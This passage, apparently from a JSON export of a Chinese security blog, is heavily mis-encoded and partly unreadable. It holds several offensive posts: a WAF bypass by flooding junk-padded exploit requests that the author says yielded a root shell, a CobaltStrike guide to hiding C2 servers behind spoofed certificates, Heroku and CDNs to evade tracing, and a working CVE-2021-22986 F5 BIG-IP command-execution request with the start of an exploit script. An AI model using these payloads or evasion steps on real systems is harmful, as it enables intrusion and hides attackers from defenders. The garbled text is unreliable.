ï¼Œåœ¨Ubuntuä¸Šä¼šæŠ¥é”™ï¼Œè€Œåœ¨Centosä¸Šä¸ä¼šæŠ¥é”™ ç”±äºç³»ç»Ÿçš„ä¸åŒï¼Œcrontrabå®šæ—¶æ–‡ä»¶ä½ç½®ä¹Ÿä¼šä¸åŒ Centosçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨/var/spool/cron/&lt;username&gt; Ubuntuå®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨/var/spool/cron/crontabs/&lt;username&gt; Centoså’ŒUbuntuå‡å­˜åœ¨çš„ï¼ˆéœ€è¦rootæƒé™ï¼‰/etc/crontab PSï¼šé«˜ç‰ˆæœ¬çš„redisé»˜è®¤å¯åŠ¨æ˜¯redisæƒé™ï¼Œæ•…å†™è¿™ä¸ªæ–‡ä»¶æ˜¯è¡Œä¸é€šçš„ ","link":"https://www.svenbeast.com/post/g2K6Xk3IG/"},{"title":"ä¸€æ¬¡\"ç»•\"è¿‡wafçš„ç»å†","content":"0x01 æè¿° å®æˆ˜ä¸­é‡åˆ°äº†2æ¬¡è¿™ç§ç»•è¿‡åœºæ™¯ï¼Œç¬¬ä¸€æ¬¡å¹¶æ²¡åœ¨æ„ï¼Œä»¥ä¸ºå¯èƒ½æ˜¯å¯¹é¢çš„wafæˆ–è€…éƒ¨ç½²æ–¹é¢æœ‰ä¸€å®šçš„é—®é¢˜ ï¼Œç„¶åç¬¬äºŒæ¬¡ä¹Ÿæ˜¯åŒæ ·æ–¹æ³•ï¼Œé‚è®°å½•ä¸€ä¸‹ 0x02 ç¬¬ä¸€æ¬¡ 1ã€‘æ˜¯ä¸€æ¬¡æ”»é˜²æ¼”ç»ƒä¸­ï¼Œä¸€äº›æ‰«ææ— æœåï¼Œæ‰‹å·¥å»æ’æŸ¥ä¸€äº›ç½‘ç«™ï¼Œåœ¨æ’æŸ¥åˆ°weblogicèµ„äº§çš„æ—¶å€™ï¼Œå‘ç°ç›®æ ‡ä¼šåœ¨è¯†åˆ«åˆ°ä¸€äº›æ•æ„Ÿè·¯å¾„æ—¶å›åŒ…resetï¼Œ\b\b\bæ„Ÿè§‰æœ‰æˆï¼Œå› ä¸º(ä¸ªäººçœ‹æ³•)å­˜åœ¨è¿™ç§wafï¼Œéƒ¨åˆ†ç”²æ–¹æœ¬åœ°è‡ªå·±äººæˆ–è€…è¯·ä¹™æ–¹å®‰å…¨å…¬å¸å»è¿›è¡Œå®‰å…¨æµ‹è¯•æ—¶ï¼Œå¦‚æœåœ¨å‘ç°wafåï¼Œå› ä¸ºä¸€äº›éƒ¨é—¨å¯èƒ½å¹¶ä¸ç›¸é€šä¸å¥½æ‰¾äººåŠ ç™½æˆ–è€…å¥‡æ€ªçš„å¿ƒç†(è¿˜è¦åŠ ç™½ï¼Ÿæ˜¯ä¸æ˜¯ä½ ä»¬èƒ½åŠ›ä¸è¡Œï¼Ÿ)ï¼Œå¾ˆå°‘ä¼šè·å¾—wafç™½åå•çš„æƒåˆ©ï¼Œè€Œå¯¹wafå¼€å¯çŠ¶æ€çš„ç›®æ ‡ç½‘ç«™è¿›è¡Œæµ‹è¯•æ—¶ï¼Œæµ‹è¯•äººå‘˜å…¶å®å¹¶ä¸ä¼šå»æ·±ç©¶wafçš„ç»•è¿‡è¿™äº›ï¼Œ\b\b\b\bæœ€åè·å¾—ç»“æœå°±æ˜¯: æ¼æ´å­˜åœ¨ï¼Œä½†æµ‹è¯•ç»“æœæ˜¯æ²¡æœ‰è¿™ä¸ªæ¼æ´ï¼Œè·å¾—ç½‘ç«™å®‰å…¨çš„è¡¨é¢ç°è±¡ã€‚ 2ã€‘åºŸè¯ä¸€ç®©ç­å‡‘å­—æ•°åˆ«ä»‹æ„ï¼Œç„¶åå°±å„ç§æƒ³åŠæ³•ï¼Œæ— æœåï¼Œç†äº†ä¸€ä¸‹è¿™ä¸ªwafçš„æ‹¦æˆªé€»è¾‘æ˜¯ï¼šè®¿é—®çš„urlè·¯å¾„ä¸­å­˜åœ¨å†å²æ¼æ´ä¸­å‡ºç°çš„æ¼æ´åˆ©ç”¨è·¯å¾„å°±ä¼šé‡ç½®é“¾æ¥ï¼Œä¸é’ˆå¯¹weblogicï¼Œéšä¾¿çš„åˆ©ç”¨é“¾æ¥åƒ.svnè¿™ç§ä¹Ÿä¼šæ‹¦ï¼Œä¹Ÿå°±æ˜¯è¯´ä»–æ˜¯æ‰€æœ‰æ¼æ´çš„åˆ©ç”¨urlçš„é»‘åå•ï¼Œè®¿é—®è·¯å¾„åœ¨é»‘åå•å†…å³é‡ç½®é“¾æ¥ã€‚ 3ã€‘æ±‚åŠ©äº†æ²¡ä»€ä¹ˆå¥½åŠæ³•ï¼Œæƒ³åˆ°sqlæ³¨å…¥æœ‰çš„åœºæ™¯æ˜¯åƒåœ¾å¡«å……è¿™äº›åŠæ³•å˜›ï¼Œç„¶åè¯•ç€æ„é€ äº†è¶…å¤§çš„cookieåŒ…ï¼Œå¤§æ¦‚æ˜¯æœåŠ¡å™¨æœ¬èº«å°±ä¼šæ‹’ç»é“¾æ¥çš„é‚£ç§é•¿åº¦å†çŸ­ä¸€ç‚¹ï¼Œå‘åŒ…åï¼Œå“ˆå“ˆï¼Œè¿˜æ˜¯æ‹’ç»é“¾æ¥ï¼Œä¸è¿‡ä»–æ‹’ç»çš„æ¯”è¾ƒæ…¢ï¼Œåˆæƒ³äº†ä¸€ä¼šï¼Œæˆ‘æƒ³ç€å†æš´åŠ›ä¸€ç‚¹ï¼Œå†™äº†ä¸ªå¤šè¿›ç¨‹pythonè„šæœ¬ï¼Œé™„ä¸Šweblogicæ¼æ´åˆ©ç”¨çš„è¯·æ±‚åŒ…å¸¦è¶…å¤§cookieçš„ï¼Œç„¶å100è¿›ç¨‹å¼€å¯ï¼Œè¿‡äº†10åˆ†é’Ÿæ”¶åˆ°äº†çŠ¶æ€ç 200çš„å›æ˜¾\bï¼Œè‡³æ­¤wafå°±è¿‡äº† 4ã€‘ä¸è¿‡åé¢ä¹Ÿå¾ˆéº»çƒ¦ï¼Œè´Ÿè½½å‡è¡¡ä»€ä¹ˆçš„ï¼Œå“ˆå“ˆï¼Œè®¾å¤‡å¤šè¿˜æ˜¯å¼ºçš„ï¼Œåæ¥æ¼”ç»ƒç»“æŸåæˆ‘å»äº†è§£äº†ä¸€ä¸‹ç›®æ ‡çš„wafäº§å“ï¼Œæ˜¯æŸæ˜çš„å¤©æ¸…xxxï¼Œå½“æ—¶è§‰å¾—2ç§åŸå› :å¯èƒ½æ˜¯ç›®æ ‡éƒ¨ç½²ä½ç½®æœ‰é—®é¢˜å¯¼è‡´æœ‰æ¼åŒ…ï¼Œä¹Ÿå¯èƒ½æ˜¯wafæœ¬èº«çš„ä¸€äº›è®¾è®¡é—®é¢˜æˆ–è€…ç‰ˆæœ¬ä¸æ˜¯æœ€æ–°ï¼Œå¹¶æ²¡è®¤ä¸ºä»¥åè¿˜ä¼šç¢°åˆ°è¿™ç§ç»•è¿‡æ¡ˆä¾‹ã€‚ 0x03 ç¬¬äºŒæ¬¡ ç¬¬ä¸€å¤© ç„¶åè¿‡äº†xxæ—¶é—´åï¼Œæ˜¯å¸®æœ‹å‹çš„ä¸€æ¬¡ä¸çŸ¥é“å•¥è¡ŒåŠ¨ä¸­ï¼Œå‘ç°ç›®æ ‡å­˜åœ¨ncï¼Œbsh.servlet.BshServleté‚£ä¸ªé¡µé¢ï¼Œé‚£ä¸ç›´æ¥å°±shelläº†ï¼Œç»“æœå‘ç°wafï¼Œé€»è¾‘æ˜¯poståŒ…ä¸­å­˜åœ¨ bsh.script= \bï¼Œå°±æ— æ³•è®¿é—®ï¼Œè™½ç„¶bpä¸Šä¸æ˜¯ç›´æ¥æ˜¾ç¤ºresetï¼Œä½†æ˜¯å·®ä¸å¤šï¼Œ\bä¹Ÿæ˜¯ä¸ªç™½é¡µé¢é‚£ç§ï¼Œç»•äº†ä¼šä¹Ÿæ²¡ç»•è¿‡å»ï¼Œä¹Ÿæ˜¯æ„é€ äº†ä¸ªå¤§åŒ…å»è·‘ï¼Œå¤§åŒ…å•¥æ ¼å¼å¿˜äº†ï¼Œç„¶åè·‘äº†10æ¥åˆ†é’Ÿä¹Ÿæ²¡ç»“æœå°±å…³äº† ç¬¬äºŒå¤© ç¬¬ä¸€å¤©æ”¶é›†äº†äº†ä¸€äº›èµ„äº§ï¼Œå› ä¸ºç›®æ ‡ä¸å°‘ï¼Œå°±æƒ³ç€æ…¢æ…¢æ¥ï¼Œç„¶åè¿˜æ˜¯å¯¹é‚£ä¸ªncä¸æ­»å¿ƒï¼Œå»æŸ¥äº†ä¸€ä¸‹IBMçš„httpserveræ€ä¹ˆè§£æhttpåŒ…ï¼Œå¾—çŸ¥æ˜¯æäº¤å¤šä¸ªç›¸åŒè¿˜æ˜¯ä¸ç›¸åŒæ— æ³•è§£æçš„å‚æ•°æ—¶ï¼Œæœ€åä¸€ä¸ªå‚æ•°æ˜¯ç»“æœï¼Œå…·ä½“å¹¶æ²¡ç†è§£ï¼Œæˆ‘åªç¡®è®¤ä¸€ä»¶äº‹æ˜¯æœ€åä¸€ä¸ªå‚æ•°æ˜¯æ¼æ´å‚æ•°å°±è¡Œäº†ï¼Œç„¶åå¼„ä¸ªcookieå¤§åŒ…ï¼Œæ¼æ´å‚æ•°å‰æ”¾äº†å…¶ä»–çš„è¶…å¤§å‚æ•°å120è¿›ç¨‹å¼€è·‘ï¼Œç„¶åå°±å»çœ‹å…¶ä»–èµ„äº§äº† è¿‡äº†ä¸çŸ¥é“å¤šé•¿æ—¶é—´ï¼Œåªè®°å¾—æŒ‰å°æ—¶è®¡ç®—ï¼ŒæœŸé—´éš”ä¸€æ®µæ—¶é—´å°±çœ‹çœ‹å‘åŒ…ç»“æœï¼Œä¸€ç›´è·‘ï¼Œæœ€åä¸‹åˆ6ç‚¹å·¦å³å§ï¼Œå‘ç°äº†æœ‰200å›åŒ…ï¼Œå¿ƒä¸­ç”šæ˜¯æ¬¢å–œï¼Œç„¶åæ”¹æˆæ‰§è¡Œå‘½ä»¤çš„poståŒ…ï¼Œç»§ç»­è·‘ï¼Œç„¶åå‡ åˆ†é’Ÿå¾ˆå¿«å°±è·‘å‡ºæ¥äº†ï¼Œrootæƒé™ï¼Œç„¶åç»™æœ‹å‹è¦äº†æœåŠ¡å™¨ipï¼Œå¼¹äº†shellã€‚ 0x04 1111 åºŸè¯ä¸€å †ï¼Œæè¿°äº†ä¸€ä¸‹å¿ƒç†æ´»åŠ¨ï¼Œå°±æ˜¯è´«ï¼Œæœ‰çš„æ—¶å€™å§ï¼Œç”¨ä¸€äº›æ—¶é—´åšæˆäº†ä»€ä¹ˆäº‹æƒ…çš„æ—¶å€™å¾ˆå¼€å¿ƒï¼Œå¾ˆå¸Œæœ›æœ‰ä¸ªäººå¯ä»¥åˆ†äº«ï¼Œç„¶åèƒ½ä¸€èµ·å¼€å¿ƒï¼Œ57uI56m25LiN6L+H5aWi5pyb572i5LqG77yM5pyJ55qE5Lq65oeS5b6X55CG5L2g77yM5pyJ55qE5Lq65oiW6K645Lya6auY5YW05LiA5LiL77yM5pyJ55qE5Lq65YW25a6e5LiN55+l6YGT5L2g5Zyo6K+05Liq5ZWl77yM5Zia5Zia6L+H5aS05LqG77yM5omA5Lul5ZGi77yMKioq55qE5a2m5bCx5a6M5LqL5LqG77yM5oGi5aSN5a2m5Lmg6YCf5bqm77yM5omp5bGV55+l6K+G5L2T57O75ZKM5rex5bqm77yB 1.\b\bcookieå’Œæäº¤å‚æ•°åƒåœ¾å¡«å……+å¤šçº¿ç¨‹ç–‘ä¼¼é€šç”¨åŠæ³• 2.\b\bä¸ªåˆ«æœåŠ¡å™¨é…ç½®æˆ–è€…wafäº§å“é…ç½®è¿‡é«˜ï¼Œéœ€è¦ä¸€äº›æ—¶é—´æ‰èƒ½ç”Ÿæ•ˆ 3.æ„é€ çš„åŒ…åˆ«å½±å“æœ€ç»ˆè§£æ ","link":"https://www.svenbeast.com/post/XVarhy0Rd/"},{"title":"CobaltStrikeçš„éšè—è®°å½•","content":"1. CobaltStrikeçš„æœåŠ¡ç«¯éšè— å› ä¸ºéƒ¨åˆ†å®‰å…¨å…¬å¸ä¼šä¸å®šæ—¶åšå…¨ç½‘çš„CobaltStrikeæœåŠ¡ç«¯çš„è¯†åˆ«ï¼Œä»è€Œå°†IPæ ‡è®°ä¸ºæ¶æ„æœåŠ¡å™¨ å› ä¸ºä¸€äº›ç½‘ç»œæµ‹ç»˜å¹³å°ä¼šæ£€æµ‹CobaltStrikeæœåŠ¡ç«¯çš„æŒ‡çº¹ï¼Œä»è€Œå¯¹æœåŠ¡å™¨è¿›è¡Œæ ‡è®° ä¸ºé¿å…ä»¥ä¸Šæƒ…å†µï¼Œæ‰€ä»¥éœ€è¦å¯¹æœåŠ¡ç«¯çš„ç‰¹å¾è¿›è¡Œéšè—ï¼Œä¸å¨èƒæƒ…æŠ¥ç›¸å¯¹æŠ— 1.1 ä¿®æ”¹é»˜è®¤ç«¯å£ æ‰“å¼€teamserverï¼Œæœ€åä¸€è¡Œä¿®æ”¹ç«¯å£50050ä¸ºå…¶ä»–ç«¯å£ 1.2 ä¿®æ”¹è¯ä¹¦ åˆ é™¤cobaltstrike.store keytool -keystore ./cobaltstrike.store -storepass è®¾å®šä¸€ä¸ªå¯†ç  -keypass åˆšæ‰è®¾å®šçš„å¯†ç  -genkey -keyalg RSA -alias baidu -dname &quot;CN=baidu.com, OU=service operation department, O=Beijing Baidu Netcom Science Technology Co., Ltd, L=beijing, S=beijing, C=CN&quot; è¿™æ ·æ‰«æè¿™å°çš„CSçš„serverç«¯å ç”¨ç«¯å£çš„è¯ä¹¦ä¾¿æ— æ³•ç¡®å®šè¿è¡Œçš„æ˜¯CS 2. CobaltStrikeçš„C2éšè— åœ¨æ”»é˜²æ¼”ç»ƒä¸­ï¼ŒæŸç§æƒ…å†µä¸‹å¯¼è‡´æ”»å‡»è¢«ç›®æ ‡å‘ç°ï¼Œç›®æ ‡ä¼šé¡ºç€çº¿ç´¢ç»§ç»­æº¯æºè¿½è¸ªåˆ°å…·ä½“æ‰§è¡Œäººï¼Œè€Œæˆ‘ä»¬çš„æœåŠ¡å™¨ä¹Ÿå°±å˜æˆæº¯æºæ–¹çš„æ”»å‡»ç›®æ ‡ä¹‹ä¸€ï¼Œé‚éœ€è¦å¯¹æˆ‘ä»¬ä½¿ç”¨çš„æœ‰å…³ä¸Šçº¿ä½¿ç”¨çš„çº¿ç´¢è¿›è¡Œéšè—,åŒæ ·ä¹Ÿæ˜¯ä¸ºäº†ä¸å¨èƒæƒ…å†µç›¸å¯¹æŠ— 2.1 ç”³è¯·å…è´¹åŸŸå åŸå› æ˜¯å…è´¹åŸŸåæ— éœ€å¤‡æ¡ˆï¼Œå³ä½¿åŸŸåæ³„éœ²ä¹Ÿä¸ä¼šè·Ÿè¸ªåˆ°æ³¨å†Œäºº é€šè¿‡freenom.comç”³è¯·å…è´¹åŸŸåï¼Œæ— éœ€å®å æ•™ç¨‹: https://zhuanlan.zhihu.com/p/115535965 å°†ç”³è¯·çš„åŸŸåè½¬å…¥dnspodä¸‹é¢è¿›è¡Œç®¡ç†(ä¸è½¬ä¹Ÿè¡Œï¼Œdnspodä¸ºè…¾è®¯äº‘è®¡ç®—å…¬å¸å…¨èµ„æ§è‚¡) æ•™ç¨‹: https://blog.csdn.net/weixin_46021924/article/details/104859155 åˆ›å»ºä¸€ä¸ªAè®°å½•æŒ‡å‘csæœåŠ¡å™¨ 2.2 éšè—C2çš„å…·ä½“IP åŸå› æ˜¯éšè—åå³ä½¿åŸŸåæ³„éœ²ï¼Œç›®æ ‡ä¹Ÿä¸ä¼šçŸ¥é“å…·ä½“C2çš„IPåœ°å€ï¼Œæ— æ³•å‘èµ·å¯¹æˆ‘ä»¬C2æœåŠ¡å™¨çš„æº¯æºæ”»å‡» 2.2.1 æ–¹æ³•1ä¸€åˆ©ç”¨herukoéšè— - æš´éœ²ä¿¡æ¯: 1.å›ºå®šåŸŸå(herokuçš„) 2.éšæœºIP(herokuçš„) - ä¼˜ç‚¹: 1.æœåŠ¡ç«¯çš„åŸŸåéšè— 2.æœåŠ¡ç«¯çš„IPéšè— 3.å¸ƒç½®ç®€å• 4.è‡ªå¸¦å¯ä¿¡çš„SSLè¯ä¹¦ 5.å…è´¹ - ç¼ºç‚¹: 1.ä¸Šçº¿é€Ÿåº¦æ…¢ æ³¨å†ŒHerokuè´¦å·ï¼Œç‚¹å‡» https://dashboard.heroku.com é€šè¿‡gmailé‚®ç®±æˆ–è€…å…¶ä»–é‚®ç®±æ³¨å†Œä¸€ä¸ªè´¦å· ç„¶åéƒ¨ç½²åº”ç”¨ï¼ŒForkçš„rootkitå¸ˆå‚…é¡¹ç›®ï¼Œherukoçš„nginxä»£ç†éƒ¨ç½²é“¾æ¥ï¼ŒApp nameçš„åå­—è‡ªè¡Œè®¾ç½®ï¼Œä¸ºä¸€ä¼šherokuç”Ÿæˆçš„åŸŸåçš„å‰ç¼€ï¼Œä¸ªåˆ«æ—¶å€™ä¼šherokuä¼šè¯†åˆ«ä¸åˆ°é¡¹ç›®ï¼Œé‡åˆ°çš„è¯éœ€è¦è‡ªå·±forkç”¨githubç™»å½•heroku TARGETï¼Œå¡«åˆšæ‰ç”³è¯·çš„åŸŸåï¼Œç«¯å£è‡ªè¡Œè®¾ç½® æ–°å»ºç›‘å¬å™¨1ï¼ŒåŸŸåå¡«ç”³è¯·çš„åŸŸåï¼Œç«¯å£å¡«herokuè®¾ç½®çš„targetçš„ç«¯å£ æ–°å»ºç›‘å¬å™¨2ï¼Œç«¯å£è®¾ç½®443ï¼ŒåŸŸåä¸ºherokuçš„åº”ç”¨åŸŸåï¼Œç‚¹å‡»open appæŸ¥çœ‹åŸŸå æµ‹è¯•ä¸Šçº¿ï¼Œéšä¾¿ç”Ÿæˆä¸ªexeï¼Œç›‘å¬å™¨é€‰æ‹©ç›‘å¬å™¨2ï¼Œè¿è¡Œä¸Šçº¿ï¼Œæ˜¾ç¤ºçš„ä¸Šçº¿ç›‘å¬å™¨ä¸ºç›‘å¬å™¨1 2.2.2 æ–¹æ³•2â€”åˆ©ç”¨å¾®æ—éšè— - æš´éœ²ä¿¡æ¯: 1.å›ºå®šIP(å¾®æ—çš„) - ä¼˜ç‚¹: 1.æœåŠ¡ç«¯çš„åŸŸåéšè— 2.æœåŠ¡ç«¯çš„IPéšè— 3.ä¸Šçº¿é€Ÿåº¦å¿«ï¼Œåªæ¯”ç”¨æœåŠ¡å™¨IPæ…¢2så·¦å³ 4.å¸ƒç½®ç®€å• - ç¼ºç‚¹: 1.ä¸€ç‚¹ç‚¹é’± 2.åªèƒ½ä½¿ç”¨å¾®æ—æœåŠ¡å™¨å›ºå®šIPä¸Šçº¿ï¼ˆå°è¯•ç”¨è¿‡åŸŸåè§£ææŒ‡å‘ï¼Œä½†æ˜¯æ€»è¢«æ‹¦ï¼Œå†…å®¹æ˜¾ç¤ºéæ³•é˜»æ–­ï¼‰ æ³¨å†Œå¾®æ—è´¦å·ï¼Œhttps://www.vx.linkï¼Œå…¶ä»–æä¾›ç±»ä¼¼æœåŠ¡çš„å¹³å°ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨çš„ è´­ä¹°åŒ…æœˆå¥—é¤ï¼Œæœ€ä¾¿å®œçš„å³å¯ é…ç½®å¾®æ— æµé‡ä¼˜åŒ–-ä¸ºæœåŠ¡å™¨æ·»åŠ æˆæƒï¼ˆå°±æ˜¯C2æœåŠ¡å™¨ï¼‰ æµé‡ä¼˜åŒ–-åˆ›å»ºæ–°çš„ vxTrans é“¾æ¥ç‚¹ï¼ˆé…ç½®è½¬å‘ï¼‰ è®¾ç½®åŸŸåè§£æ(å…¶å®å¾®æ—åªæ˜¯ä»–æœ‰å‡ å°æœåŠ¡å™¨ç„¶åè½¬å‘ä½ è®¾ç½®çš„ç«¯å£çš„æµé‡è€Œå·²ï¼Œä»–çš„IPä¹Ÿæ˜¯å›ºå®šçš„) ç¤ºä¾‹ä¸­æˆ‘ç”¨çš„ä¸­å›½2è¿™å°ï¼Œpingä»–çš„åŸŸåå¾—çŸ¥IPä¸º182.118.xx.xx æ–°å»ºç›‘å¬å™¨1ï¼Œç«¯å£ä¸ºå¾®æ—è½¬å‘åˆ°æœåŠ¡å™¨è®¾ç½®çš„10000ç«¯å£ï¼ŒåŸŸåä¸ºc2æœåŠ¡å™¨è‡ªèº«IP æ–°å»ºç›‘å¬å™¨2ï¼ŒåŸŸåå¡«å¾®æ—æœåŠ¡å™¨IP 182.118.xx.xxï¼Œç«¯å£å¡«å¾®æ—è½¬å‘åˆ°æœåŠ¡å™¨è®¾ç½®çš„3xxxxç«¯å£ æµ‹è¯•ä¸Šçº¿ï¼Œéšä¾¿ç”Ÿæˆä¸ªexeï¼Œç›‘å¬å™¨é€‰æ‹©ç›‘å¬å™¨2ï¼Œè¿è¡Œä¸Šçº¿ï¼Œæ˜¾ç¤ºçš„ä¸Šçº¿ç›‘å¬å™¨ä¸ºç›‘å¬å™¨1 2.2.3 æ–¹æ³•3â€”åˆ©ç”¨å›½å¤–CDNéšè— - æš´éœ²ä¿¡æ¯: 1.å›ºå®šåŸŸå(è‡ªå·±çš„å…è´¹åŸŸå) 2.éšæœºIP(CDNå‚å•†çš„) - ä¼˜ç‚¹: 1.æœåŠ¡ç«¯çš„IPéšè— 2.å…è´¹ - ç¼ºç‚¹: 1.ä¸Šçº¿é€Ÿåº¦æ…¢ æ³¨å†Œhttps://www.cloudflare.com/ï¼ŒæŒ‰ç…§ç½‘ç«™æ•™ç¨‹ä¸ºå…è´¹åŸŸåéƒ¨ç½²CDN å¼€å¯ ç¼“å­˜â€”å¼€å‘è€…æ¨¡å¼ï¼Œå¦åˆ™æ— æ³•æ‰§è¡Œå‘½ä»¤ï¼Œä»¥åä½¿ç”¨çš„æ—¶å€™ä¹Ÿè¦æ£€æŸ¥æ˜¯å¦å¼€å¯ï¼Œæ­¤é¡¹ä¼šä¸å®šæ—¶è‡ªåŠ¨å…³é—­ å…è´¹å¥—é¤é™åˆ¶äº†ä½¿ç”¨çš„ç«¯å£ï¼Œ cloudflareå¯è®¿é—®çš„ç«¯å£](https://support.cloudflare.com/hc/zh-cn/articles/200169156-Identifying-network-ports-compatible-with-Cloudflare-s-proxy) æ³¨æ„ç”Ÿæˆçš„ä¿¡æ¯æ‰‹åŠ¨å¤åˆ¶ä¿å­˜ä¸€ä¸‹ï¼Œxxx.pem,xxx.key ç”Ÿæˆxxxxxx.p12 openssl pkcs12 -export -in xxx.pem -inkey xxx.key -out domain.p12 -name å…è´¹åŸŸå -passout pass:è®¾å®šä¸€ä¸ªå¯†ç  ç”Ÿæˆæ–°çš„cobaltstrike.storeæ–‡ä»¶ï¼Œæˆ‘å‘½åä¸ºnew.store keytool -importkeystore -deststorepass å¯†ç  -destkeypass å¯†ç  -destkeystore new.store -srckeystore spoofdomain.p12 -srcstoretype PKCS12 -srcstorepass å¯†ç  -alias å…è´¹åŸŸå é…ç½®C2.profileï¼Œé™„copyçš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œè‡ªè¡Œä¿®æ”¹ï¼Œå¡«å¥½åç”¨c2lint c2.profileéªŒè¯ä¸€ä¸‹ git clone https://github.com/FortyNorthSecurity/C2concealer.git cd C2concealer ./install.sh C2concealer --variant 1 --hostname å…è´¹åŸŸå 3 new.storeçš„è·¯å¾„ new.storeçš„å¯†ç  æˆåŠŸç”Ÿæˆxxxx.profile c2lint xxxx.profile ç¡®å®šè¿™ä¸ªé…ç½®æ–‡ä»¶æ˜¯å¦èƒ½æ­£å¸¸å·¥ä½œ ä¿®æ”¹teamserveré…ç½® vim teamserver æœ€åä¸€è¡Œæ‰¾å¯¹åº”çš„æ”¹ä¸€ä¸‹ -Djavax.net.ssl.keyStore=./new.store ï¼ˆè¯ä¹¦ç”Ÿæˆçš„new.storeæ–‡ä»¶åœ°å€ï¼‰ -Djavax.net.ssl.keyStorePassword=xxxxxxï¼ˆä¸Šé¢storeæ–‡ä»¶çš„å¯†ç ï¼‰ åˆ›å»ºç›‘å¬å™¨ æµ‹è¯•ä¸Šçº¿ï¼Œéšä¾¿ç”Ÿæˆä¸ªexeï¼Œé€‰æ‹©åˆ›å»ºçš„ç›‘å¬å™¨ï¼Œè¿è¡Œä¸Šçº¿ï¼Œå¤§æ¦‚11ç§’ä¸»æœºä¸Šçº¿ 2.2.4 æ–¹æ³•4â€”åˆ©ç”¨å›½å†…CDNéšè— - æš´éœ²ä¿¡æ¯: 1.å›ºå®šåŸŸå 2.éšæœºIP(CDNå‚å•†çš„) - ä¼˜ç‚¹: 1.é«˜ä¿¡åŸŸå 2.IPä¹Ÿæ˜¯CDNçš„IP 3.ä¸Šçº¿é€Ÿåº¦å¿« - ç¼ºç‚¹: 1.ä¸€ç‚¹ç‚¹é’± 2.ä¸èƒ½è¢«CDNæ‰€å±å…¬å¸çš„æº¯æºé˜Ÿä¼ç¢°åˆ° ä½¿ç”¨è…¾è®¯äº‘çš„å…¨ç«™åŠ é€Ÿä¸¾ä¾‹ ç‚¹å‡»æäº¤åï¼Œæœ¬åœ°pingæˆ–è€…ç”¨ç«™é•¿ä¹‹å®¶çš„pingåŠŸèƒ½å¯¹è…¾è®¯äº‘æä¾›çš„CNAMEé‚£ä¸ªåŸŸåè¿›è¡Œpingï¼Œè·å¾—ç›®æ ‡IPï¼Œè¿™æ ·å°±å¯ä»¥åˆ©ç”¨cdnä½¿ç”¨hostæ¥è¯†åˆ«è¯·æ±‚åŸŸåæ¥è¿›è¡Œé€šä¿¡äº† å¯ä»¥ä½¿ç”¨å‘½ä»¤è¿›è¡Œæ£€æŸ¥æ˜¯å¦å¯ä»¥æ­£å¸¸é€šä¿¡ curl -v -H &quot;Host: test1.baidu.com&quot; http://ç›®æ ‡IP/test ç„¶åæ–°å»ºä¸€ä¸ªç›‘å¬ï¼Œprofileæ–‡ä»¶å¯ä»¥åœ¨ç½‘ä¸Šæ‰¾ä¸€ä¸ªï¼ŒæŠŠé‡Œé¢çš„hostéƒ½æ”¹æˆcdnçš„åŸŸå 3. CobaltStrikeçš„ä¸Šçº¿ç«¯éšè— å› ä¸ºç›®æ ‡çš„å®‰å…¨å»ºè®¾å¤šæœ‰ä¸€äº›æµé‡ç›‘æµ‹è®¾å¤‡å’Œå…¶ä»–å®‰å…¨è®¾å¤‡ï¼Œä¼šå¯¹CobaltStrikeçš„ä¸Šçº¿æµé‡è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œä»è€Œè¿›è¡ŒæŠ¥è­¦æ‹¦æˆªï¼Œæ ¹æ®æš´éœ²çš„åŸŸåæˆ–è€…ä¸»æœºï¼Œè¿˜ä¼šå¯¼è‡´è¢«æº¯æºçš„å‡ ç‡å¤§å¤§å¢åŠ ã€‚ æ•…éœ€è¦å¯¹ä¸Šçº¿ç«¯-&gt;æœåŠ¡ç«¯çš„ç‰¹å¾è¿›è¡Œéšè—ï¼Œä¸æº¯æºã€å¨èƒæƒ…æŠ¥ã€IPå°ç¦è¿›è¡Œå¯¹æŠ— åˆ©ç”¨Profileé…ç½®æ–‡ä»¶å¯¹ç›®æ ‡åˆ°C2ä¹‹é—´çš„æµé‡å’Œè¯ä¹¦è¿›è¡Œè‡ªå®šä¹‰é…ç½®ï¼Œè¾¾åˆ°å°½é‡å‡å°‘ç‰¹å¾çš„ç›®çš„ï¼Œå…·ä½“å†…å®¹ï¼Œé¸½äº†é¸½äº†ã€‚ã€‚æ¯•ç«Ÿæ˜¯ä»¥å‰çš„ç¬”è®°0.0 ","link":"https://www.svenbeast.com/post/ny5NkDd40/"},{"title":"CVE-2021-22986 F5 BIG-IP æœªæˆæƒå‘½ä»¤æ‰§è¡Œ","content":"å®‰è£…f5 BIG-IP,fqç‚¹å‡»ä¸‹è½½ ç„¶ååŒå‡».ovaæˆ–è€…å¯¼å…¥VirtualBoxä¸­æ‰“å¼€è™šæ‹Ÿæœºï¼Œè®¾ç½®ä¸€ä¸ªå¼ºå¯†ç  è¯¶å˜¿~ ã€‚ã€‚æˆ‘çš„å®‰å¥½äº†ï¼Œç‰¹åˆ«å°ï¼Œå¯èƒ½æ˜¯æˆ‘å±å¹•åˆ†è¾¨ç‡å¤ªé«˜çš„åŸå› ï¼Œä¹Ÿä¸å¤ªä¼šç”¨è¿™ä¸ªbox ä¾æ¬¡è¾“å…¥ root default default 123!@#qwe (éšä¾¿è®¾ç½®ä¸€ä¸ªå¼ºå£ä»¤ï¼Œå¦åˆ™æ— æ³•é€šè¿‡) è·å¾—IP,å› ä¸ºæˆ‘çš„å±å¹•å¤ªå°ï¼Œæ‰€ä»¥ç”¨çš„ifconfig|moreä¸€è¡Œä¸€è¡Œå€’çš„ ç›®æ ‡åœ°å€:https://192.168.0.107ï¼Œå°è¯•ä½¿ç”¨ admin/åˆšæ‰è®¾ç½®çš„å¼ºå£ä»¤è¿›è¡Œç™»å½•ï¼Œç¬¬ä¸€æ¬¡ç™»å½•è®©ä¿®æ”¹å¯†ç ï¼Œç…§åšä¾¿æ˜¯ã€‚ Payload POST /mgmt/tm/util/bash HTTP/1.1 Host: 192.168.0.107 Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.25.0 Authorization: Basic YWRtaW46c3YzbmJlYXN0 X-F5-Auth-Token: Content-Length: 42 Content-Type: application/json {&quot;utilCmdArgs&quot;: &quot;-c id&quot;, &quot;command&quot;: &quot;run&quot;} Exp import requests,sys,json from requests.auth import HTTPBasicAuth requests.packages.urllib3.disable_warnings() banner = ''' __ _____ ______ _____ _____ 